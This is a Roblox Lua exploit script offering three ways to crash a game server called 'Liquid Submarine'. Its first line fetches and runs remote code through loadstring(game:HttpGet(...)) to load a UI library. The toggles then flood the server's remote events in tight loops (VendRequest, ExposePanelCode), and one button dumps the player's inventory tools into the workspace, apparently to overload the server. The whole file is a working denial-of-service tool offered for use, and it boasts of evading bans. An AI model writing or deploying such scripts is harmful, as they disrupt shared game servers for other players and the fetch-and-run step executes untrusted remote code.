local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Liquid Submarine Server Crasher by lunar0x4", "GrapeTheme")
local Tab = Window:NewTab("Main")
local Section = Tab:NewSection("Crash Server")

local crash1 = false
local crash2 = false

Section:NewToggle("Crash Server (Method 1) (BEST)", "Crashes the server within 10 seconds.", function(state)
    crash1 = state

    task.spawn(function()
        while crash1 do
            for _, p in pairs(game:GetService("Players"):GetPlayers()) do
                workspace
                    :WaitForChild("SCP294")
                    :WaitForChild("ScriptedComponents")
                    :WaitForChild("Vend")
                    :WaitForChild("VendRequest")
                    :FireServer(p.DisplayName)
            end
            task.wait(0.0001) -- prevent freezing
        end
    end)
end)

Section:NewToggle("Crash Server (Method 2)", "A chat spammer, won't get you banned.", function(state)
    crash2 = state

    task.spawn(function()
        while crash2 do
            game:GetService("ReplicatedStorage").ExposePanelCode:FireServer()
            task.wait(0.01)
        end
    end)
end)

Section:NewLabel("For method 3, make sure your inventory is full of items.")

Section:NewButton("Crash Server (Method 3)", "Drops everything in your inventory once.", function()
    local player = game:GetService("Players").LocalPlayer
    local char = player.Character
    local backpack = player:WaitForChild("Backpack")

    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            tool.Parent = char
            task.wait()
            tool.Parent = workspace
        end
    end

    if char then
        for _, tool in ipairs(char:GetChildren()) do
            if tool:IsA("Tool") then
                tool.Parent = workspace
            end
        end
    end
end)
